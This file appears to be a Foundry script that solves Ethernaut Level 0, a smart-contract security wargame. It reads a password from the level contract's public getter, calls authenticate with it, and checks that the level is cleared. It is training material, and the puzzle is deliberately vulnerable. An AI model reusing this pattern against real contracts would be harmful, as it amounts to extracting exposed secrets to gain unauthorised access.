// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level0.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level0Solution is Script {
    
    Level0 public level0 = Level0(0x9C27364c0C4C0bFCAF0A671e4b2D898D687CBd8e);


    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY")); // Use the private key that deployed your Ethernaut instance
        
        string memory pass = level0.password(); // Read the password directly
        console.log("Extracted Password:", pass);
        
        level0.authenticate(pass); // Authenticate using the extracted password

        bool cleared = level0.getCleared();
        require(cleared, "Authentication failed!");
        console.log("Success! Level cleared.");

        vm.stopBroadcast();
    }
        
}

